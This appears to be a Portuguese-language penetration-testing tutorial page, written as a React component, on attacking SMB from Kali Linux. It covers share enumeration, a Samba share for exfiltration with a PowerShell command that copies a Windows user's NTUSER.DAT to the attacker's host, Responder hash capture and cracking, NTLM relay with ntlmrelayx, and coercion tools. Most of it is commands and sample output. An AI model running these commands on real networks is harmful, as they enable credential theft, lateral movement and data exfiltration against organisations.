import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Samba() {
  return (
    <PageContainer
      title="Samba & SMB — cliente, servidor, captura de NTLM"
      subtitle="SMB é o protocolo de file-sharing mais explorado da história Windows. No Kali ele é tanto cliente (smbclient, mount.cifs, enum4linux) quanto arma (responder, ntlmrelayx, smbserver.py)."
      difficulty="intermediario"
      timeToRead="26 min"
    >
      <h2>SMB em 30 segundos</h2>
      <p>
        SMB (Server Message Block) é o protocolo nativo Windows para arquivos,
        impressoras, named pipes (RPC, MS-RPC, DCERPC). Versões: SMB1 (CIFS, inseguro,
        ainda em IoT/embedded), SMB2 (Vista+), SMB3 (Win8+, criptografia). Roda em
        <code>445/tcp</code> direto, e legado em <code>139/tcp</code> via NetBIOS.
      </p>
      <p>
        No Linux, <strong>Samba</strong> é a implementação que serve SMB
        (<code>smbd</code>) e participa de domínios (<code>winbindd</code>). No Kali
        você usa Samba mais como <em>servidor de captura</em> e como <em>cliente</em>{" "}
        em recon.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y samba smbclient cifs-utils",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "smbclient --version && smbd --version",
            out: `Version 4.21.2-Debian
Version 4.21.2-Debian`,
            outType: "info",
          },
        ]}
      />

      <h2>smbclient — o "ftp" do SMB</h2>
      <CommandTable
        title="smbclient — usos diários em recon"
        variations={[
          {
            cmd: "smbclient -L //10.10.10.5 -N",
            desc: "Lista shares do alvo. -N = null session (sem credencial).",
            output: "Sharename       Type      Comment\nADMIN$          Disk      Remote Admin\nIPC$            IPC       Remote IPC\npublic          Disk      Public files",
          },
          {
            cmd: "smbclient -L //10.10.10.5 -U 'user%senha'",
            desc: "Autenticado. % separa user e password (atenção a $ no shell).",
            output: "Mostra shares que o usuario enxerga.",
          },
          {
            cmd: "smbclient //10.10.10.5/public -N",
            desc: "Conecta no share. Prompt smb: \\>",
            output: "Try \"help\" to get a list of possible commands.\nsmb: \\>",
          },
          {
            cmd: "smbclient //10.10.10.5/share -U user -c 'recurse ON; prompt OFF; mget *'",
            desc: "Download recursivo do share inteiro em um comando.",
            output: "getting file \\folder\\file1.txt of size 1024 ...",
          },
          {
            cmd: "smbclient //10.10.10.5/IPC$ -U guest -c 'ls'",
            desc: "Acesso a named pipes (geralmente sucesso = enumeração possível).",
            output: "tree connect failed: NT_STATUS_ACCESS_DENIED OU prompt vazio.",
          },
          {
            cmd: "smbclient -L //10.10.10.5 -N -m SMB2 --option='client min protocol=NT1'",
            desc: "Forçar SMB1 (alvos legados que negam SMB2).",
            output: "SMB1 disabled — não conecta em DC moderno.",
          },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "smbclient -L //10.10.10.5 -N",
            out: `        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        netlogon        Disk      
        SYSVOL          Disk      
        backups         Disk      Old backups
        Users           Disk      
SMB1 disabled -- no workgroup available`,
            outType: "info",
          },
          {
            cmd: "smbclient //10.10.10.5/backups -N",
            out: `Try "help" to get a list of possible commands.
smb: \\>`,
            outType: "success",
          },
          {
            cmd: "ls",
            user: "smb: \\",
            host: "",
            path: "",
            noPrompt: true,
            out: `  .                                   D        0  Wed Apr  3 09:12:05 2026
  ..                                  D        0  Wed Apr  3 09:12:05 2026
  payroll-2024.xlsx                   A   145922  Mon Mar 31 14:22:11 2026
  domain-backup.bak                   A 12842009  Sun Mar 30 02:01:00 2026
  passwords.txt                       A     1284  Fri Mar 28 18:33:42 2026

                14334974 blocks of size 1048576. 8421 blocks available`,
            outType: "warning",
          },
          {
            cmd: "get passwords.txt",
            user: "smb: \\",
            host: "",
            path: "",
            noPrompt: true,
            out: `getting file \\passwords.txt of size 1284 as passwords.txt (250.4 KiloBytes/sec)`,
            outType: "success",
          },
        ]}
      />

      <h2>Montar share como filesystem</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo mkdir -p /mnt/loot",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo mount -t cifs //10.10.10.5/backups /mnt/loot -o username=guest,password=,vers=3.0",
            out: "(silencioso = sucesso)",
            outType: "success",
          },
          {
            cmd: "ls -la /mnt/loot",
            out: `total 12554
drwxr-xr-x 2 root root      0 Apr  3 09:12 .
drwxr-xr-x 3 root root   4096 Apr  3 10:42 ..
-rwxr-xr-x 1 root root 145922 Mar 31 14:22 payroll-2024.xlsx
-rwxr-xr-x 1 root root  12842009 Mar 30 02:01 domain-backup.bak
-rwxr-xr-x 1 root root   1284 Mar 28 18:33 passwords.txt`,
            outType: "info",
          },
          {
            comment: "monte com credencial em arquivo (não vaza no ps)",
            cmd: "echo -e 'username=svc_backup\\npassword=Welcome2024!\\ndomain=CORP' | sudo tee /root/.smbcred && sudo chmod 600 /root/.smbcred",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo mount -t cifs //10.10.10.5/backups /mnt/loot -o credentials=/root/.smbcred,vers=3.0",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo umount /mnt/loot",
            out: "(silencioso)",
            outType: "muted",
          },
        ]}
      />

      <h2>Enumeração massiva</h2>
      <CommandTable
        title="As 4 ferramentas indispensáveis"
        variations={[
          {
            cmd: "enum4linux-ng -A 10.10.10.5",
            desc: "All-in-one: shares, users, groups, password policy, OS, RID cycling.",
            output: "Combina rpcclient, smbclient, nmblookup em um único relatório.",
          },
          {
            cmd: "nxc smb 10.10.10.0/24",
            desc: "NetExec (sucessor do CrackMapExec): SMB sweep em range.",
            output: "SMB 10.10.10.5 445 DC01 [*] Windows Server 2019 (name:DC01) (domain:corp.local)",
          },
          {
            cmd: "nxc smb 10.10.10.5 -u user -p pass --shares",
            desc: "Lista shares com permissão (READ, WRITE) por usuário.",
            output: "[*] Enumerating shares\n[*] backups          READ\n[*] netlogon         READ\n[*] users            READ,WRITE",
          },
          {
            cmd: "rpcclient -U '' -N 10.10.10.5",
            desc: "MSRPC interativo: enumdomusers, querydominfo, lsaquery, etc.",
            output: "rpcclient $> enumdomusers\nuser:[Administrator] rid:[0x1f4]",
          },
          {
            cmd: "smbmap -H 10.10.10.5 -u user -p pass -R",
            desc: "Recursive listing com permissões.",
            output: "Mostra árvore inteira com R/W em cada arquivo.",
          },
          {
            cmd: "nmap -sV -p445 --script smb-* 10.10.10.5",
            desc: "Scripts NSE: smb-vuln-ms17-010 (EternalBlue), smb-enum-shares, smb-os-discovery.",
            output: "smb-vuln-ms17-010: VULNERABLE → caminho direto pra RCE.",
          },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "enum4linux-ng -A 10.10.10.5 2>/dev/null | head -40",
            out: `ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.10.5
[*] Username ......... ''
[*] Random Username .. 'wxyz1234'

 =====================================
|    Service Scan on 10.10.10.5     |
 =====================================
[*] Checking SMB
[+] SMB         : Server allows session using username '', password ''
[*] Checking SMB over IP

 =====================================
|    NetBIOS Names for 10.10.10.5    |
 =====================================
[+] Got domain/workgroup name: CORP
[+] Got domain SID: S-1-5-21-1004336348-1177238915-682003330

 =====================================
|    Sessions Check on 10.10.10.5    |
 =====================================
[+] Server allows sessions using username '', password ''

 =====================================
|    RID Cycling on 10.10.10.5       |
 =====================================
[+] CORP\\Administrator (Local User)
[+] CORP\\krbtgt        (Local User)
[+] CORP\\Domain Admins (Domain Group)
[+] CORP\\jsmith        (Domain User)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Servidor Samba para receber loot</h2>
      <p>
        Cenário: você tem RCE em alvo Windows e quer exfiltrar arquivos sem subir em
        provider externo (que vai ser logado por proxy/EDR). Solução: rode SMB no Kali,
        peça pro alvo copiar para você.
      </p>

      <CodeBlock
        language="ini"
        title="/etc/samba/smb.conf (mínimo p/ exfil)"
        code={`[global]
   workgroup = WORKGROUP
   server string = Files Server
   server min protocol = SMB2
   smb encrypt = required
   map to guest = Bad User
   log file = /var/log/samba/log.%m
   max log size = 1000

[loot]
   path = /opt/loot
   browseable = yes
   read only = no
   guest ok = yes
   force user = root
   create mask = 0755`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo mkdir -p /opt/loot && sudo chmod 777 /opt/loot",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo testparm -s /etc/samba/smb.conf",
            out: `Load smb config files from /etc/samba/smb.conf
Loaded services file OK.
Server role: ROLE_STANDALONE`,
            outType: "info",
          },
          {
            cmd: "sudo systemctl restart smbd nmbd",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "no alvo Windows (via reverse shell):",
            cmd: 'powershell.exe "copy C:\\\\Users\\\\Admin\\\\NTUSER.DAT \\\\\\\\10.0.0.5\\\\loot\\\\ntuser.dat"',
            user: "C:\\Users\\Admin",
            host: "TARGET",
            path: "",
            out: "(silencioso = arquivo veio pra /opt/loot/ntuser.dat)",
            outType: "warning",
          },
          {
            comment: "de volta no Kali",
            cmd: "ls -la /opt/loot/",
            out: `total 1058
drwxrwxrwx 2 root root    4096 Apr  3 11:42 .
drwxr-xr-x 5 root root    4096 Apr  3 11:38 ..
-rwxr-xr-x 1 root root 1048576 Apr  3 11:42 ntuser.dat`,
            outType: "success",
          },
        ]}
      />

      <h2>smbserver.py do Impacket — share descartável</h2>
      <p>
        Pra subir um share rápido sem mexer em <code>/etc/samba/</code>, o
        <code>smbserver.py</code> do Impacket é mágico. Roda em foreground, loga
        cada conexão, suporta SMB2, e <strong>captura hash NTLM</strong> de quem
        tentar autenticar.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "mkdir -p /tmp/share && cd /tmp/share && cp /usr/share/windows-resources/binaries/PsExec.exe .",
            out: "(silencioso — armou um share com PsExec dentro)",
            outType: "muted",
          },
          {
            cmd: "sudo impacket-smbserver -smb2support TOOLS /tmp/share",
            out: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed`,
            outType: "info",
          },
          {
            comment: "no target Windows: \\\\IP\\TOOLS\\PsExec.exe vira disponível",
            cmd: 'powershell.exe "iwr \\\\\\\\10.0.0.5\\\\TOOLS\\\\PsExec.exe -OutFile psexec.exe"',
            user: "C:\\temp",
            host: "TARGET",
            path: "",
            out: "[*] Incoming connection (10.0.0.42,49123)\n[*] AUTHENTICATE_MESSAGE (TARGET\\\\jsmith,TARGET)\n[*] User TARGET\\\\jsmith authenticated successfully",
            outType: "warning",
          },
        ]}
      />

      <h2>Captura de NTLM com Responder</h2>
      <p>
        Quando uma máquina Windows tenta resolver um nome que NÃO existe no DNS
        normal, ela cai em LLMNR/NBT-NS multicast. <code>Responder</code> escuta esse
        broadcast e responde "sou eu" — Windows então tenta autenticar com hash
        NTLMv2, que você captura pra crackar com hashcat (modo 5600).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "configure /etc/responder/Responder.conf — desligue HTTP/SMB se vai usar ntlmrelayx",
            cmd: "sudo responder -I eth0 -wv",
            out: `                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
                                  

[+] Listening for events...

[!] Use of LLMNR/NBT-NS is enabled. To capture credentials simply wait.
[*] [LLMNR]  Poisoned answer sent to 10.0.0.42 for name fileshare
[SMB] NTLMv2-SSP Client   : 10.0.0.42
[SMB] NTLMv2-SSP Username : CORP\\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:5C1A3...4F:0101000000000000B0...`,
            outType: "warning",
          },
          {
            comment: "salvar o hash e mandar pro hashcat",
            cmd: "echo 'jsmith::CORP:11223344...:5C1A3...:0101000000000000B0...' > capt.txt",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "hashcat -m 5600 capt.txt /usr/share/wordlists/rockyou.txt",
            out: `Hashes: 1 digests; 1 unique digests, 1 unique salts
[..]
JSMITH::CORP:11223344:5C1A3:...:Welcome2024!

Recovered........: 1/1 (100.00%) Digests`,
            outType: "success",
          },
        ]}
      />

      <h2>NTLM Relay — quando crackear não vale a pena</h2>
      <p>
        Se a senha for forte, você não vai crackar em tempo útil. Solução:
        <strong>relay</strong> a autenticação para outro alvo onde aquele usuário
        tem acesso. <code>ntlmrelayx.py</code> do Impacket faz isso —
        ideal contra alvos com <em>SMB Signing = OFF</em> (default em workstations).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) descubra alvos com signing desligado",
            cmd: "nxc smb 10.10.10.0/24 --gen-relay-list relay.txt",
            out: `SMB         10.10.10.5    445  DC01    [*] Windows Server 2019 (signing:True)
SMB         10.10.10.10   445  WS01    [*] Windows 10 (signing:False)   <-- alvo
SMB         10.10.10.11   445  WS02    [*] Windows 10 (signing:False)   <-- alvo`,
            outType: "info",
          },
          {
            cmd: "cat relay.txt",
            out: `10.10.10.10
10.10.10.11`,
            outType: "default",
          },
          {
            comment: "2) desligue HTTP/SMB do Responder antes (Responder.conf)",
            cmd: "sudo sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "3) terminal A: ntlmrelayx escutando",
            cmd: "sudo impacket-ntlmrelayx -tf relay.txt -smb2support -socks",
            out: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] SOCKS proxy started. Listening at 127.0.0.1:1080
[*] Servers started, waiting for connections`,
            outType: "info",
          },
          {
            comment: "4) terminal B: Responder envenenando LLMNR",
            cmd: "sudo responder -I eth0",
            out: `[*] [LLMNR]  Poisoned answer sent to 10.10.10.42 for name fileshare
[*] [SMB] Connection from 10.10.10.42 — relayed`,
            outType: "warning",
          },
          {
            comment: "5) na janela do ntlmrelayx aparece sessão SOCKS",
            cmd: "(observa)",
            out: `[*] Authenticating against smb://10.10.10.10 as CORP/JSMITH SUCCEED
[*] SOCKS: Adding CORP/JSMITH@10.10.10.10(445) to active SOCKS connection. Enjoy
[*] Triggered relay for ALL targets`,
            outType: "success",
          },
          {
            comment: "6) use proxychains pra falar com aquele alvo COMO se fosse o user",
            cmd: "proxychains -q nxc smb 10.10.10.10 -u jsmith -p X --shares",
            out: `SMB    10.10.10.10  445  WS01  [*] Windows 10
SMB    10.10.10.10  445  WS01  [+] CORP\\jsmith:X (Pwn3d!)
SMB    10.10.10.10  445  WS01  [*] Enumerating shares
SMB    10.10.10.10  445  WS01  ADMIN$  READ,WRITE  Admin
SMB    10.10.10.10  445  WS01  C$      READ,WRITE  Default share`,
            outType: "success",
          },
        ]}
      />

      <AlertBox type="danger" title="SMB Signing = Required mata o relay">
        <p>
          DC, file servers e qualquer máquina Windows com signing obrigatório
          rejeita o relay. Workstations costumam ter signing OFF — por isso o
          <code>--gen-relay-list</code> do nxc filtra antes. Se TUDO no ambiente
          tem signing ON, parta para Kerberos relay (Coercer + ntlmrelayx{" "}
          <code>--remove-mic</code>) ou ESC8 via certificados.
        </p>
      </AlertBox>

      <h2>Coercion — forçar autenticação</h2>
      <p>
        Esperar o usuário tentar resolver "fileshare" pode demorar. Coercion =
        forçar uma máquina Windows a autenticar contra o seu Responder/relay.
      </p>

      <CommandTable
        title="Ferramentas de coercion"
        variations={[
          {
            cmd: "coercer coerce -u user -p pass -d corp.local -t 10.10.10.5 -l 10.10.10.42",
            desc: "Tenta TODOS os métodos de coerção (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce).",
            output: "(força DC a tentar autenticar contra você)",
          },
          {
            cmd: "PetitPotam.py -u user -p pass 10.10.10.42 10.10.10.5",
            desc: "MS-EFSRPC abuse — clássico contra DC.",
            output: "Trying pipe lsarpc — Connected!",
          },
          {
            cmd: "printerbug.py corp.local/user:pass@10.10.10.5 10.10.10.42",
            desc: "MS-RPRN — Print Spooler. Sempre funciona se Spooler estiver on.",
            output: "[+] Successfully triggered authentication",
          },
        ]}
      />

      <PracticeBox
        title="Pipeline completo: smbserver → exfil → relay"
        goal="Subir share descartável no Kali, transferir um arquivo de um alvo, e em seguida demonstrar captura de hash via Responder."
        steps={[
          "Crie /tmp/share com um arquivo qualquer.",
          "Suba impacket-smbserver com SMB2 e nome 'TOOLS'.",
          "Em outro terminal, simule cliente: smbclient //127.0.0.1/TOOLS -N e baixe o arquivo.",
          "Pare o smbserver e suba responder em modo de captura.",
          "Provoque uma autenticação contra o Kali (digite \\\\IP\\NaoExiste no Run do Windows ou faça smbclient //IP_KALI/x -U fake_user).",
          "Confirme captura do hash NTLMv2.",
        ]}
        command={`# 1. setup
mkdir -p /tmp/share && echo "loot" > /tmp/share/test.txt

# 2. smbserver
sudo impacket-smbserver -smb2support TOOLS /tmp/share &
sleep 2

# 3. cliente (de outro shell ou outra máquina)
smbclient //127.0.0.1/TOOLS -N -c 'ls; get test.txt'

# 4. encerre smbserver e abra responder
sudo pkill -f smbserver.py
sudo responder -I eth0 -wv

# 5. de outra máquina/alvo:
#    smbclient //IP_DO_KALI/qualquer -U vitima  (qualquer senha)`}
        expected={`[*] Config file parsed
[*] Incoming connection (127.0.0.1,42412)
getting file \\test.txt of size 5 ...

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.56.1
[SMB] NTLMv2-SSP Username : WORKGROUP\\vitima
[SMB] NTLMv2-SSP Hash     : vitima::WORKGROUP:1122334455667788:6F1B...:0101000000000000...`}
        verify="Você deve ver: (1) transferência bem sucedida do test.txt via smbserver e (2) o hash NTLMv2 capturado pelo responder. Esse hash, salvo em arquivo, alimenta diretamente hashcat -m 5600."
      />

      <AlertBox type="info" title="OPSEC pós-engagement">
        <p>
          Sempre derrube smbd/responder e remova{" "}
          <code>/etc/samba/smb.conf</code> customizado, montagens em{" "}
          <code>/mnt</code> e arquivos em <code>/opt/loot</code> antes de
          desligar a estação. Loot vai pro cofre do cliente, hash vai pro
          relatório, máquina volta ao zero.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
